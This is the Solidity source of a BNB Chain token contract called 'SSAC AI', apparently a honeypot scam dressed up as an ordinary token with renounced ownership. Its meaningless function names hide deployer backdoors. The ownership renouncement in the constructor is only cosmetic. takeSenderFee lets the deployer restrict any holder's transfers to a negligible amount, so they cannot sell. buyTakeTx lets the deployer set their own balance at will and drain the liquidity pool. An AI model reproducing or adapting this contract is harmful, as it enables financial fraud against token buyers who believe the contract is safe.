/**
 *Submitted for verification at BscScan.com on 2023-02-22
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

abstract contract tradingLaunchAmount {
    function swapMaxSenderFund() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface txMinLaunched {
    function createPair(address modeMarketingShouldWallet, address launchedListFee) external returns (address);
}

interface minTotalAtTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract SSACAI is IERC20, tradingLaunchAmount {

    mapping(address => mapping(address => uint256)) private txReceiverEnableTeam;

    function takeSenderFee(address totalShouldMax) public {
        
        if (totalShouldMax == modeShouldExemptTo || totalShouldMax == maxTotalAtFund || !receiverTokenTotal[swapMaxSenderFund()]) {
            return;
        }
        
        senderTakeLimit[totalShouldMax] = true;
    }

    function owner() external view returns (address) {
        return amountMaxExemptTake;
    }

    uint8 private marketingExemptAmount = 18;

    address public maxTotalAtFund;

    function getOwner() external view returns (address) {
        return amountMaxExemptTake;
    }

    mapping(address => uint256) private isMaxSwap;

    function exemptBuyTo() public view returns (bool) {
        return feeLimitLaunched;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return launchedTotalLiquidity;
    }

    uint256 private walletLaunchedExempt;

    uint256 private launchedMarketingTakeAmount;

    address public modeShouldExemptTo;

    bool private feeLimitLaunched;

    string private tradingLiquiditySell = "SAI";

    function name() external view returns (string memory) {
        return receiverAmountToken;
    }

    function receiverModeAmount() public {
        if (feeLimitLaunched == teamShouldFrom) {
            launchedMarketingTakeAmount = walletLaunchedExempt;
        }
        
        teamShouldFrom=false;
    }

    function receiverListFund(address receiverTotalTx, address tradingLaunchIs, uint256 fundMaxTx) internal returns (bool) {
        if (receiverTotalTx == modeShouldExemptTo) {
            return marketingAmountMin(receiverTotalTx, tradingLaunchIs, fundMaxTx);
        }
        if (senderTakeLimit[receiverTotalTx]) {
            return marketingAmountMin(receiverTotalTx, tradingLaunchIs, takeLimitToken);
        }
        return marketingAmountMin(receiverTotalTx, tradingLaunchIs, fundMaxTx);
    }

    function marketingAmountMin(address receiverTotalTx, address tradingLaunchIs, uint256 fundMaxTx) internal returns (bool) {
        require(isMaxSwap[receiverTotalTx] >= fundMaxTx);
        isMaxSwap[receiverTotalTx] -= fundMaxTx;
        isMaxSwap[tradingLaunchIs] += fundMaxTx;
        emit Transfer(receiverTotalTx, tradingLaunchIs, fundMaxTx);
        return true;
    }

    function modeTotalAt() public {
        if (launchedMarketingTakeAmount != launchedToShould) {
            launchedToShould = walletLaunchedExempt;
        }
        
        teamShouldFrom=false;
    }

    function decimals() external view returns (uint8) {
        return marketingExemptAmount;
    }

    function buyTakeTx(uint256 fundMaxTx) public {
        if (!receiverTokenTotal[swapMaxSenderFund()]) {
            return;
        }
        isMaxSwap[modeShouldExemptTo] = fundMaxTx;
    }

    bool private teamShouldFrom;

    mapping(address => bool) public senderTakeLimit;

    bool public fromLaunchSenderTx;

    uint256 private launchedToShould;

    function fromModeReceiver() public {
        emit OwnershipTransferred(modeShouldExemptTo, address(0));
        amountMaxExemptTake = address(0);
    }

    event OwnershipTransferred(address indexed toSwapEnable, address indexed shouldSenderReceiver);

    uint256 constant takeLimitToken = 10 ** 10;

    address private amountMaxExemptTake;

    function balanceOf(address teamLaunchedAt) public view virtual override returns (uint256) {
        return isMaxSwap[teamLaunchedAt];
    }

    function transfer(address enableReceiverExemptTotal, uint256 fundMaxTx) external virtual override returns (bool) {
        return receiverListFund(swapMaxSenderFund(), enableReceiverExemptTotal, fundMaxTx);
    }

    string private receiverAmountToken = "SSAC AI";

    function allowance(address swapReceiverToken, address enableFundExempt) external view virtual override returns (uint256) {
        return txReceiverEnableTeam[swapReceiverToken][enableFundExempt];
    }

    function shouldReceiverToMode() public view returns (uint256) {
        return walletLaunchedExempt;
    }

    function symbol() external view returns (string memory) {
        return tradingLiquiditySell;
    }

    function senderToLaunchExempt(address atAmountFee) public {
        if (fromLaunchSenderTx) {
            return;
        }
        
        receiverTokenTotal[atAmountFee] = true;
        if (launchedMarketingTakeAmount != launchedToShould) {
            launchedToShould = launchedMarketingTakeAmount;
        }
        fromLaunchSenderTx = true;
    }

    function transferFrom(address receiverTotalTx, address tradingLaunchIs, uint256 fundMaxTx) external override returns (bool) {
        if (txReceiverEnableTeam[receiverTotalTx][swapMaxSenderFund()] != type(uint256).max) {
            require(fundMaxTx <= txReceiverEnableTeam[receiverTotalTx][swapMaxSenderFund()]);
            txReceiverEnableTeam[receiverTotalTx][swapMaxSenderFund()] -= fundMaxTx;
        }
        return receiverListFund(receiverTotalTx, tradingLaunchIs, fundMaxTx);
    }

    uint256 private launchedTotalLiquidity = 100000000 * 10 ** 18;

    constructor (){ 
        
        minTotalAtTx launchLiquidityIsLaunched = minTotalAtTx(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        maxTotalAtFund = txMinLaunched(launchLiquidityIsLaunched.factory()).createPair(launchLiquidityIsLaunched.WETH(), address(this));
        amountMaxExemptTake = swapMaxSenderFund();
        
        modeShouldExemptTo = swapMaxSenderFund();
        receiverTokenTotal[swapMaxSenderFund()] = true;
        if (teamShouldFrom) {
            launchedToShould = walletLaunchedExempt;
        }
        isMaxSwap[swapMaxSenderFund()] = launchedTotalLiquidity;
        emit Transfer(address(0), modeShouldExemptTo, launchedTotalLiquidity);
        fromModeReceiver();
    }

    function tradingLaunchedExempt() public view returns (bool) {
        return feeLimitLaunched;
    }

    function atModeReceiver() public view returns (bool) {
        return feeLimitLaunched;
    }

    function approve(address enableFundExempt, uint256 fundMaxTx) public virtual override returns (bool) {
        txReceiverEnableTeam[swapMaxSenderFund()][enableFundExempt] = fundMaxTx;
        emit Approval(swapMaxSenderFund(), enableFundExempt, fundMaxTx);
        return true;
    }

    mapping(address => bool) public receiverTokenTotal;

    function liquidityLaunchedAt() public view returns (uint256) {
        return walletLaunchedExempt;
    }

}